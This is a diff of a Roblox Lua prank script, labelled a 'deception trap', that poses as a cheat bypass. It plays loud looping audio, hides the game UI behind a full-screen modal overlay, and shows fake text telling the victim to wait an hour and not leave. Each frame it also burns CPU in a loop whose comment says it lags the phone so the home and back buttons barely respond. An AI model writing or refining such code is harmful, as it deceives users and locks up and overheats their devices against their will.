@@ -1,26 +1,29 @@
--- [[ DekaTeamHub: ULTIMATE DECEPTION TRAP ]] --
--- [[ TACO AUDIO | NO SIGNAL VISUAL | FAKE BYPASS ]] --
-
+-- [[ DekaTeamHub: ABSOLUTE TACO BRUTE FORCE ]] --
 task.spawn(function()
-    -- 1. FORCE AUDIO (TACO TIME)
-    local function playTaco(parent)
+    local SS = game:GetService("SoundService")
+    
+    -- 1. ULTIMATE AUDIO BYPASS (SPAM PLAY)
+    local function forceAudio()
         local s = Instance.new("Sound")
-        s.SoundId = "rbxassetid://142276005" -- IT'S RAINING TACOS
+        s.SoundId = "rbxassetid://142276005" -- TACO
         s.Volume = 10
         s.Looped = true
-        s.Parent = parent
+        s.Parent = SS
+        
+        -- Coba berbagai metode play
         s:Play()
+        pcall(function() SS:PlayLocalSound(s) end) 
     end
-    pcall(function() playTaco(game:GetService("SoundService")) end)
+    
+    forceAudio()
 
-    -- 2. DISABLE SYSTEM
-    local SG = game:GetService("StarterGui")
-    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+    -- 2. DISABLE SYSTEM & UI
+    pcall(function()
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
 
-    -- 3. CREATE VISUAL TRAP
-    local PG = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    local screen = Instance.new("ScreenGui", PG)
-    screen.Name = "DekaDeception"
+    -- 3. VISUAL TRAP (COLOR BARS + FAKE TEXT)
+    local screen = Instance.new("ScreenGui", game:GetService("CoreGui"))
     screen.DisplayOrder = 2147483647
     screen.IgnoreGuiInset = true
 
@@ -30,7 +33,7 @@ task.spawn(function()
     B.Modal = true
     B.Text = ""
 
-    -- Color Bars Background
+    -- Rainbow Bars
     local Bars = Instance.new("Frame", B)
     Bars.Size = UDim2.new(1, 0, 1, 0)
     local colors = {
@@ -47,23 +50,19 @@ task.spawn(function()
         f.BorderSizePixel = 0
     end
 
-    -- FAKE STATUS TEXT (THE DECEPTION)
-    local Status = Instance.new("TextLabel", B)
-    Status.Size = UDim2.new(0.8, 0, 0.4, 0)
-    Status.Position = UDim2.new(0.1, 0, 0.3, 0)
-    Status.BackgroundColor3 = Color3.new(0, 0, 0)
-    Status.BackgroundTransparency = 0.2
-    Status.TextColor3 = Color3.new(1, 1, 1)
-    Status.TextScaled = true
-    Status.Font = "Code"
-    Status.BorderSizePixel = 4
-    Status.Text = "SABAR TUNGGU DULU...\nSCRIPT BYPASS SEMUANYA DULU\nBYPASSING ANTI CHEAT...\nANTI DETECTED...\nANTI VIRUS...\nANTI REPORT...\nANTI BAN..."
+    -- FAKE TEXT (Sesuai foto Tuan)
+    local T = Instance.new("TextLabel", B)
+    T.Size = UDim2.new(0.8, 0, 0.4, 0)
+    T.Position = UDim2.new(0.1, 0, 0.3, 0)
+    T.BackgroundTransparency = 1
+    T.TextColor3 = Color3.new(1, 0, 0)
+    T.TextScaled = true
+    T.Font = "Code"
+    T.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU!\nKALAU GAK BYPASS BAKAL DI BAN!!"
 
-    -- 4. GLITCH & LAG ENGINE
+    -- 4. GLITCH ENGINE
     game:GetService("RunService").RenderStepped:Connect(function()
         Bars.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
-        
-        -- Glitch Putih Noise
         if math.random(1, 5) == 1 then
             local n = Instance.new("Frame", B)
             n.Size = UDim2.new(1, 0, 0, math.random(5, 30))
@@ -72,11 +71,11 @@ task.spawn(function()
             n.BackgroundTransparency = 0.5
             task.delay(0.02, function() n:Destroy() end)
         end
-        
-        -- Lag Generator (HP Panas)
-        for i = 1, 2500000 do local _ = i * i end
+        -- Bikin lag biar gak bisa pencet tombol home/back lancar
+        for i = 1, 3000000 do local _ = i * i end
     end)
 end)
+
 
 
 
